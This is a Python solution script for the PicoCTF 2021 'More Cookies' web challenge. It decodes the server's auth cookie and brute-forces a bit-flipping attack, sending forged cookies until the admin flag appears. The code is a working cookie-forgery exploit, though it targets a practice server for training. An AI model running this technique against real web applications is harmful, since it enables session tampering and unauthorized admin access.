# Inspired by https://www.youtube.com/watch?v=Fs3EbH-Wdhc
# This code is modified for understanding. Original code at: https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/improved_script.py

import requests
import base64

ADDRESS = "http://mercury.picoctf.net:56136/"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]
decoded_cookie = base64.b64decode(cookie)
raw_cookie = base64.b64decode(decoded_cookie)
print(f"Initial Cookie: {cookie}")
print(f"Decoded Cookie: {decoded_cookie}")
print(f"Raw Cookie: {raw_cookie}")

def exploit():
    for position_idx in range(0, len(raw_cookie)):
        for bit_idx in range(0, 8):
            bitflip_guess = (
                raw_cookie[0:position_idx]
                + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                + raw_cookie[position_idx + 1:]
            )
            print(f"Byte Position: {position_idx}")
            print(f"Bit index in byte: {bit_idx}")
            print(f'Flipped bit: {raw_cookie[0:position_idx] + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))}')
            print(" ")

            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()
            r = requests.get(ADDRESS, cookies={"auth_name": guess})
            if "picoCTF{" in r.text:
                print(f"Admin bit found in byte {position_idx} bit {bit_idx}")
                print(f'Flipped bit worked: {raw_cookie[0:position_idx] + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))}')
                print(f"Constructed cookie: {guess}")
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return


exploit()
